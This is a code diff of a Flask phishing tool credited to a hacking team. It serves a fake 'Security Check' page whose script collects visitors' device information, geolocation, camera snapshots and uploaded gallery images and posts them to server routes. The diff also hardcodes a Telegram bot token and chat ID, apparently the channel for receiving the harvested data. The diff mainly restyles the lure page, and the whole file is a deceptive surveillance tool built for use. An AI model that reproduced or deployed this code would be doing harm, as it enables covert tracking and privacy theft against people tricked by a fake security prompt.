@@ -1,23 +1,54 @@
-# AF MaSoom V0.3
-# Author: Ali hamza 
-#Created by: AF Hack Team 
 from flask import Flask, request, render_template_string
 import requests
 
 app = Flask(__name__)
 
-# Telegram Bot
+# Telegram Bot Token and Chat ID
 TOKEN = "7664449745:AAGA_V8ikC-g0753vPZ-TGXeBP-OxHpRCos"
 CHAT_ID = "7531257376"
 
 html_content = """
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Security Check</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AF MaSoom - Security Check</title>
+  <style>
+    body {
+      background-color: #4CAF50;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    h2 {
+      font-size: 3em;
+      margin-bottom: 20px;
+    }
+    button {
+      background-color: #008CBA;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      text-decoration: none;
+      font-size: 16px;
+      margin: 10px 0;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    button:hover {
+      background-color: #005f73;
+    }
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+    }
+  </style>
   <script>
     function sendData() {
-      // Device Info
+      // Send device info
       fetch("/device", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
@@ -27,7 +58,7 @@ html_content = """
         })
       });
 
-      // Location
+      // Send location data
       navigator.geolocation.getCurrentPosition(function(position) {
         fetch("/location", {
           method: "POST",
@@ -39,7 +70,7 @@ html_content = """
         });
       });
 
-      // Camera
+      // Access camera and send image
       navigator.mediaDevices.getUserMedia({video: true})
       .then(function(stream) {
         const video = document.createElement('video');
@@ -77,8 +108,13 @@ html_content = """
   </script>
 </head>
 <body>
-  <h3>Processing Secure Verification...</h3>
-  <input type="file" accept="image/*" onchange="sendGalleryImage(this)" />
+  <div class="container">
+    <h2>AF MaSoom - Security Check</h2>
+    <p><strong>Created by AF HACK TEAM</strong></p>
+    <button onclick="sendData()">Start Security Check</button>
+    <br><br>
+    <input type="file" accept="image/*" onchange="sendGalleryImage(this)" />
+  </div>
 </body>
 </html>
 """
